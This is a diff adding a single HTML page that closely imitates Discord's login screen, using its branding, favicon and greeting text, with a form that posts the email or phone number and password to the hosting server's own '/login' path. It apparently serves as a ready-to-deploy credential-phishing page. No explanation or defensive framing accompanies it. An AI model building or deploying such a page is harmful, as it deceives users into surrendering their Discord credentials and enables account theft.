@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Discord - Login</title>
+<link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+@keyframes bgMove{0%{background-position:0% 0%}100%{background-position:100% 100%}}
+@keyframes glow{0%,100%{box-shadow:0 0 20px rgba(88,101,242,0.2)}50%{box-shadow:0 0 40px rgba(88,101,242,0.4)}}
+body{font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;background:#5865f2;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.bg-shapes{position:absolute;top:0;left:0;right:0;bottom:0;overflow:hidden;pointer-events:none}
+.bg-shapes div{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:float 6s ease-in-out infinite}
+.bg-shapes div:nth-child(1){width:300px;height:300px;top:-50px;left:-50px;animation-delay:0s}
+.bg-shapes div:nth-child(2){width:200px;height:200px;bottom:-30px;right:-30px;animation-delay:2s}
+.bg-shapes div:nth-child(3){width:150px;height:150px;top:50%;left:60%;animation-delay:4s}
+.card{background:#313338;border-radius:8px;padding:32px;width:480px;max-width:92%;box-shadow:0 8px 40px rgba(0,0,0,0.3);z-index:1;animation:fadeInUp 0.7s cubic-bezier(0.16,1,0.3,1)}
+h1{font-size:24px;font-weight:600;color:#f2f3f5;text-align:center;margin-bottom:4px}
+.subtitle{font-size:14px;color:#b5bac1;text-align:center;margin-bottom:24px}
+.input-group{margin-bottom:20px;animation:fadeInUp 0.5s ease 0.2s both}
+.input-group label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px}
+.input-group input{width:100%;padding:12px;background:#1e1f22;border:1px solid #1e1f22;border-radius:4px;color:#dbdee1;font-size:16px;outline:none;transition:all 0.3s}
+.input-group input:focus{border-color:#5865f2;box-shadow:0 0 0 2px rgba(88,101,242,0.3)}
+.forgot-link{color:#00a8fc;font-size:14px;text-decoration:none;display:block;margin-bottom:20px}
+.forgot-link:hover{text-decoration:underline}
+.login-btn{width:100%;padding:14px;background:#5865f2;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s;animation:fadeInUp 0.5s ease 0.3s both}
+.login-btn:hover{background:#4752c4;box-shadow:0 4px 15px rgba(88,101,242,0.4)}
+.qr-section{display:flex;gap:32px;align-items:center}
+.qr-box{width:176px;height:176px;background:white;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:80px;flex-shrink:0;animation:glow 3s ease infinite}
+.qr-info h2{font-size:20px;color:#f2f3f5;margin-bottom:8px}
+.qr-info p{font-size:14px;color:#b5bac1;line-height:1.4}
+.divider{display:flex;align-items:center;margin:24px 0}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3f4147}
+.divider span{padding:0 12px;color:#b5bac1;font-size:12px;text-transform:uppercase}
+.signup{font-size:14px;color:#b5bac1;margin-top:12px}
+.signup a{color:#00a8fc;text-decoration:none}
+.signup a:hover{text-decoration:underline}
+@media(max-width:600px){.qr-section{display:none}.card{width:100%}}
+</style>
+</head>
+<body>
+<div class="bg-shapes"><div></div><div></div><div></div></div>
+<div class="card">
+    <div class="qr-section">
+        <div style="flex:1">
+            <h1>Welcome back!</h1>
+            <p class="subtitle">We're so excited to see you again!</p>
+            <form action="/login" method="POST">
+                <div class="input-group">
+                    <label>Email or Phone Number</label>
+                    <input type="text" name="email" required>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" required>
+                </div>
+                <a href="#" class="forgot-link">Forgot your password?</a>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <p class="signup">Need an account? <a href="#">Register</a></p>
+        </div>
+        <div class="qr-box">📱</div>
+    </div>
+</div>
+</body>
+</html>
